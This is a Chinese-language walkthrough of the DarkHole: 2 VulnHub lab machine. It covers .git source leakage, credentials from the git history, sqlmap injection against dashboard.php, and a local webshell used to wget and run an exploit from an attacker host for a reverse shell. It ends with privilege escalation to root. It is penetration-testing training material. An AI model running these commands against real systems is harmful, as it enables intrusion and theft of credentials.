靶场搭建

靶机下载地址：DarkHole: 2 ~ VulnHub

下载后使用 VirtualBox 导入，网络设置为 NAT 模式。攻击机使用 Kali Linux。

信息收集

主机发现
arp-scan -l
端口扫描
nmap --min-rate 10000 -p- 192.168.21.145
nmap -sV -sT -O -p22,80 192.168.21.145

开放端口：22（SSH）、80（HTTP）。

Git 源码泄露

GitHacker 恢复源码

访问 80 端口发现网站存在 .git 目录泄露，使用 GitHacker 下载完整源码：

pip install githacker
githacker --url http://192.168.21.145/.git/ --output-folder 1
git log 历史凭证

查看 git 提交记录：

git log --oneline

找到第二次提交中添加了默认凭证，切换到该提交并查看 login.php：

git checkout <commit-hash>
cat login.php

获取后台登录凭证：lush@admin.com / admin。

Web 登录与 SQL 注入

登录后台

使用获取的凭证登录网站后台，进入 dashboard 页面。

SQL 注入获取 SSH 凭证

观察 URL 发现 dashboard.php?id=1 存在 SQL 注入，使用 sqlmap 枚举：

sqlmap -u 'http://192.168.21.145/dashboard.php?id=1' --cookie "PHPSESSID=..." -D darkhole_2 -T ssh --columns -dump --batch

成功获取 SSH 凭证：jehad / 321。

SSH 登录

ssh jehad@192.168.21.145

本地 Webshell 利用

发现 9999 端口 webshell

查看 history 发现之前有人操作过本地 9999 端口，查看定时任务：

cat /etc/crontab

发现 /opt/web 目录中存在 webshell（一句话木马），通过 9999 端口提供 RCE：

curl http://localhost:9999/?cmd=id
反弹 Shell

在攻击机编写反弹 Shell 脚本并开启 HTTP 服务：

# 攻击机监听
nc -lvp 4444

通过 webshell 下载并执行 exp：

curl http://localhost:9999/?cmd=wget%20http://192.168.21.134/exp%20-O%20/tmp/exp
curl http://localhost:9999/?cmd=bash%20/tmp/exp

成功获取反弹 Shell，升级为交互式：

python3 -c "import pty;pty.spawn('/bin/bash')"

提权至 root

查看 history 发现 losy 用户的密码：

history

历史记录中包含密码 gang，切换用户：

su losy

losy 用户可执行 sudo 提权：

sudo su root

成功获取 root 权限。

Flag

获取 root 权限后读取 flag 文件完成渗透。
